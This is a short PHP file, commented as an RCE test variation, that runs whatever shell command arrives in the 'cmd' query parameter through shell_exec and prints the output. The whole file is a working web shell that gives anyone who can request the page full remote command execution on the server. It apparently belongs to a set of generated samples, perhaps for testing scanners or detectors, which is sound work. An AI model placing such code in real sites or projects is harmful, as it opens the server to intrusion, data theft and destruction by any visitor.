<?php
// RCE test variation #655
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>